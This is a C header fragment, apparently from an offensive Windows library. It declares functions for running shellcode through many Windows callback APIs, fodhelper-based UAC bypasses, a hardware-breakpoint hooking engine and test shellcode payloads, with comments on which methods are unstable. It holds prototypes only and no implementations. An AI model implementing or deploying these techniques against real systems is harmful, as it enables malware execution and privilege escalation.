BOOL MpfSceViaEnumDateFormatsW(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
BOOL MpfSceViaEnumDesktopWindows(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
BOOL MpfSceViaEnumDesktopsW(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
BOOL MpfSceViaEnumDirTreeW(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
BOOL MpfSceViaEnumDisplayMonitors(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
BOOL MpfSceViaEnumFontFamiliesExW(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
BOOL MpfSceViaEnumFontsW(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
BOOL MpfSceViaEnumLanguageGroupLocalesW(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
BOOL MpfSceViaEnumObjects(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
BOOL MpfSceViaEnumResourceTypesExW(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
BOOL MpfSceViaEnumSystemCodePagesW(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
BOOL MpfSceViaEnumSystemGeoID(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
BOOL MpfSceViaEnumSystemLanguageGroupsW(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
BOOL MpfSceViaEnumSystemLocalesEx(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
BOOL MpfSceViaEnumThreadWindows(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
BOOL MpfSceViaEnumTimeFormatsEx(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
BOOL MpfSceViaEnumUILanguagesW(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
BOOL MpfSceViaEnumWindowStationsW(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
BOOL MpfSceViaEnumWindows(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
BOOL MpfSceViaEnumerateLoadedModules64(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
BOOL MpfSceViaK32EnumPageFilesW(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
BOOL MpfSceViaEnumPwrSchemes(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
BOOL MpfSceViaMessageBoxIndirectW(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes); //Unstable, only triggers on certain button presses, prone to crashing
BOOL MpfSceViaImmEnumInputContext(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
BOOL MpfSceViaCertFindChainInStore(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes); //Not working?
BOOL MpfSceViaEnumPropsExW(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
BOOL MpfSceViaCreateThreadpoolWait(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes); //Unstable, some shellcode crashes application, requires improved testing
BOOL MpfSceViaCryptEnumOIDInfo(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
BOOL MpfSceViaDSA_EnumCallback(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
BOOL MpfSceViaCreateTimerQueueTimer(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes); //Unstable, some shellcode crashes application, requires improved testing
BOOL MpfSceViaEvtSubscribe(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes); //Unstable, some shellcode crashes application, requires improved testing
BOOL MpfSceViaFlsAlloc(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
BOOL MpfSceViaInitOnceExecuteOnce(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
BOOL MpfSceViaChooseColorW(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
BOOL MpfSceViaClusWorkerCreate(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
BOOL MpfSceViaSymEnumProcesses(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
BOOL MpfSceViaImageGetDigestStream(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
BOOL MpfSceViaVerifierEnumerateResource(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);
BOOL MpfSceViaSymEnumSourceFiles(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes);


/*******************************************
 UAC BYPASSES
*******************************************/
BOOL UacBypassFodHelperMethodA(_In_ PCHAR PathToBinaryToExecute, _Inout_ PPROCESS_INFORMATION Pi);
BOOL UacBypassFodHelperMethodW(_In_ PWCHAR PathToBinaryToExecute, _Inout_ PPROCESS_INFORMATION Pi);


/*******************************************
 RAD HARDWARE BREAKPOINT HOOKING ENGINE FUNCTIONS
*******************************************/
BOOL InitHardwareBreakpointEngine(VOID);
BOOL ShutdownHardwareBreakpointEngine(VOID);
LONG ExceptionHandlerCallbackRoutine(_In_ PEXCEPTION_POINTERS ExceptionInfo);
BOOL SetHardwareBreakpoint(_In_ DWORD ThreadId, _In_ PUINT_VAR_T Address, _In_ UINT Position, _In_ BOOL Init);
BOOL InsertDescriptorEntry(_In_ PUINT_VAR_T Address, _In_ DWORD Position, _In_ EXCEPTION_CALLBACK CallbackRoutine, _In_ DWORD Tid, _In_ BOOL Dis);
BOOL RemoveDescriptorEntry(_In_ PUINT_VAR_T Address, _In_ DWORD Tid);
BOOL SnapshotInsertHardwareBreakpointHookIntoTargetThread(_In_ PUINT_VAR_T Address, _In_ DWORD Position, _In_ BOOL Init, _In_ DWORD Tid);
INT __demonstration_WinMain(VOID); //hook sleep


/*******************************************
 GENERIC SHELLCODE PAYLOADS FOR TESTINGS
*******************************************/
PCHAR GenericShellcodeHelloWorldMessageBoxA(_Out_ PDWORD SizeOfShellcodeInBytes);
PCHAR GenericShellcodeOpenCalcExitThread(_Out_ PDWORD SizeOfShellcodeInBytes);
PCHAR GenericShellcodeHelloWorldMessageBoxAEbFbLoop(_Out_ PDWORD SizeOfShellcodeInBytes);